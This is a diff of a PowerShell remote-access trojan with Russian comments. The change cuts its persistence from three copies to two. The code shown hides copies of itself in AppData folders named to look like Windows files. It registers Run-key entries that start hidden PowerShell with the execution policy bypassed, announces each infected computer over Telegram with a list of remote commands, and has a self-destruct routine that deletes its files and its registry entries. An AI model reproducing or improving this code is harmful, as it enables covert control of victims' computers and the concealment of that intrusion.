@@ -115,7 +115,7 @@ function Compress-Folder {
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $scriptName = "WindowsSystem_" + (Get-Random -Minimum 1000 -Maximum 9999) + ".exe"
 
-# Создаем скрытую папку в защищенном месте
+# Создаем скрытую папку в AppData
 $hiddenDir = "$env:APPDATA\Microsoft\Windows\SystemCache"
 if (!(Test-Path $hiddenDir)) { 
     New-Item -ItemType Directory -Path $hiddenDir -Force | Out-Null
@@ -128,36 +128,18 @@ if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
 $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
 $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
 
-# Дублируем в несколько мест для надежности
-$backupPath1 = "$env:LOCALAPPDATA\Microsoft\Windows\Security\$scriptName"
-$backupPath2 = "$env:PROGRAMDATA\Microsoft\Windows\System32Cache\$scriptName"
+# Дублируем в другое место для надежности
+$backupPath = "$env:LOCALAPPDATA\Microsoft\Windows\Security\$scriptName"
+$scriptContent | Out-File -FilePath $backupPath -Encoding UTF8
+Set-ItemProperty -Path $regPath -Name "WindowsSecurityUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$backupPath`"" -Force
 
-# Создаем резервные директории
-$backupDir1 = "$env:LOCALAPPDATA\Microsoft\Windows\Security"
-$backupDir2 = "$env:PROGRAMDATA\Microsoft\Windows\System32Cache"
-
-if (!(Test-Path $backupDir1)) { 
-    New-Item -ItemType Directory -Path $backupDir1 -Force | Out-Null
-    attrib +s +h "$backupDir1" 2>&1 | Out-Null
-}
-if (!(Test-Path $backupDir2)) { 
-    New-Item -ItemType Directory -Path $backupDir2 -Force | Out-Null
-    attrib +s +h "$backupDir2" 2>&1 | Out-Null
-}
-
-$scriptContent | Out-File -FilePath $backupPath1 -Encoding UTF8
-$scriptContent | Out-File -FilePath $backupPath2 -Encoding UTF8
-
-# Создаем несколько записей автозагрузки с разными именами
 Set-ItemProperty -Path $regPath -Name "WindowsSystem" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
-Set-ItemProperty -Path $regPath -Name "WindowsSecurity" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$backupPath1`"" -Force
-Set-ItemProperty -Path $regPath -Name "SystemCache" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$backupPath2`"" -Force
 
 # Основные переменные
 $currentDir = "C:\"
 $global:LastSentMessage = ""
 
-# Отправка информации о запуске
+# Отправка информации о запуске (без отчета о самоуничтожении)
 Send-Telegram "RAT активирован на $env:COMPUTERNAME
 Доступные команды:
 /help - список команд
@@ -263,8 +245,7 @@ $($fileList -join "`n")"
                             # Удаление из автозагрузки
                             try {
                                 Remove-ItemProperty -Path $regPath -Name "WindowsSystem" -Force -ErrorAction Stop
-                                Remove-ItemProperty -Path $regPath -Name "WindowsSecurity" -Force -ErrorAction Stop
-                                Remove-ItemProperty -Path $regPath -Name "SystemCache" -Force -ErrorAction Stop
+                                Remove-ItemProperty -Path $regPath -Name "WindowsSecurityUpdate" -Force -ErrorAction Stop
                                 $report += "`n✓ Записи автозагрузки удалены"
                             } catch {
                                 $success = $false
@@ -272,68 +253,44 @@ $($fileList -join "`n")"
                             }
                             
                             # Удаление файлов
-                            $filesRemoved = 0
-                            $totalFiles = 0
-                            
-                            $filesToRemove = @($scriptPath, $backupPath1, $backupPath2)
-                            foreach ($file in $filesToRemove) {
-                                $totalFiles++
-                                if (Test-Path $file) { 
-                                    try {
-                                        Remove-Item $file -Force -ErrorAction Stop
-                                        $filesRemoved++
-                                    } catch {
-                                        $success = $false
-                                    }
-                                }
-                            }
-                            
-                            $report += "`n✓ Файлы удалены: $filesRemoved/$totalFiles"
-                            
-                            # Удаление папок
                             try {
+                                if (Test-Path $scriptPath) { 
+                                    Remove-Item $scriptPath -Force -ErrorAction Stop
+                                    $report += "`n✓ Основной файл удален"
+                                }
+                                if (Test-Path $backupPath) { 
+                                    Remove-Item $backupPath -Force -ErrorAction Stop
+                                    $report += "`n✓ Резервный файл удален"
+                                }
                                 if (Test-Path $hiddenDir) { 
                                     Remove-Item $hiddenDir -Recurse -Force -ErrorAction Stop
                                     $report += "`n✓ Скрытая папка удалена"
                                 }
-                                if (Test-Path $backupDir1) { 
-                                    Remove-Item $backupDir1 -Recurse -Force -ErrorAction Stop
-                                    $report += "`n✓ Резервная папка 1 удалена"
-                                }
-                                if (Test-Path $backupDir2) { 
-                                    Remove-Item $backupDir2 -Recurse -Force -ErrorAction Stop
-                                    $report += "`n✓ Резервная папка 2 удалена"
-                                }
                             } catch {
                                 $success = $false
-                                $report += "`n✗ Ошибка удаления папок"
+                                $report += "`n✗ Ошибка удаления файлов"
                             }
                             
-                            # Создаем задачу для удаления текущего скрипта после завершения
+                            # Удаление текущего скрипта через планировщик
                             try {
                                 $currentScript = $MyInvocation.MyCommand.Path
-                                if (Test-Path $currentScript) {
-                                    $taskName = "Cleanup_" + (Get-Random -Minimum 1000 -Maximum 9999)
-                                    $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c timeout 5 && del `"$currentScript`" /f /q"
-                                    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)
-                                    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force -ErrorAction Stop | Out-Null
-                                    $report += "`n✓ Задача удаления создана"
-                                }
+                                $taskName = "Cleanup_" + (Get-Random -Minimum 1000 -Maximum 9999)
+                                $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c timeout 3 && del `"$currentScript`" /f /q"
+                                $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
+                                Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force -ErrorAction Stop
+                                $report += "`n✓ Задача удаления текущего файла создана"
                             } catch {
-                                $report += "`n⚠ Не удалось создать задачу удаления"
+                                $report += "`n⚠ Не удалось создать задачу удаления текущего файла"
                             }
                             
-                            if ($success -and $filesRemoved -eq $totalFiles) {
+                            if ($success) {
                                 $report += "`n`n✅ Самоуничтожение завершено УСПЕШНО. Все следы удалены."
                             } else {
                                 $report += "`n`n⚠ Самоуничтожение завершено с ОШИБКАМИ. Некоторые следы могли остаться."
                             }
                             
                             Send-Telegram $report
-                            
-                            # Завершаем процесс
-                            Start-Sleep -Seconds 3
-                            Stop-Process -ProcessId $PID
+                            exit
                         }
                     }
                 }
